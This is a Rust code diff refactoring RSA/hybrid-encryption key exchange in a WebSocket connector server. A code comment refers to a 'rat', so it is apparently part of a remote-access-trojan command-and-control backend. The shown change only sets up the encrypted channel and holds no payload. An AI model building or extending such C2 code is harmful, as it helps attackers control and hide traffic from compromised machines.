@@ -6,14 +6,16 @@ use futures_util::{
     SinkExt, StreamExt,
 };
 use rsa::{
-    pkcs1::{DecodeRsaPublicKey, EncodeRsaPrivateKey, EncodeRsaPublicKey},
+    pkcs1::{DecodeRsaPublicKey, EncodeRsaPublicKey},
     RsaPrivateKey, RsaPublicKey,
 };
 use tokio_tungstenite::WebSocketStream;
 use tungstenite::Message;
 
-use super::hybrid_crypto::{HybridDecryption, HybridEncryptionResult};
-use crate::connector_server::hybrid_crypto::{encrypt_data_combined, generate_private_key};
+use crate::connector_server::utils::hybrid_crypto_util::generate_private_key;
+
+use super::utils::hybrid_crypto_util::{encrypt_data_combined, HybridDecryption};
+
 #[derive(Debug)]
 #[allow(dead_code)]
 pub struct Instance {
@@ -108,21 +110,15 @@ impl Instance {
         );
         hybrid_decryption.decrypt(self.private_key.clone().unwrap())
     }
-
-    pub async fn init_keys(&mut self) -> (String, String) {
+    //make it return error
+    pub async fn init_keys(&mut self) -> (RsaPublicKey, RsaPrivateKey) {
         //Send pong for rat to generate a public key
         self.send_message("pong").await;
 
-        let mut public_key = String::from("");
-        let mut private_key_string = String::from("");
         if let Some(message) = &self.read.next().await {
-            public_key = message.as_ref().unwrap().to_string();
+            let public_key = message.as_ref().unwrap().to_string();
             //Generate private key and also assign it
             let private_key = generate_private_key();
-            private_key_string = private_key
-                .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
-                .unwrap()
-                .to_string();
             //Get public key from what user sends us
             self.set_public_key(RsaPublicKey::from_pkcs1_pem(public_key.as_str()).unwrap());
             self.set_private_key(private_key.to_owned());
@@ -139,7 +135,10 @@ impl Instance {
             )
             .await;
         }
-        println!("rsa init sequence with complete");
-        (public_key, private_key_string)
+        println!("Rsa init sequence with instance complete");
+        (
+            self.public_key.clone().unwrap(),
+            self.private_key.clone().unwrap(),
+        )
     }
 }
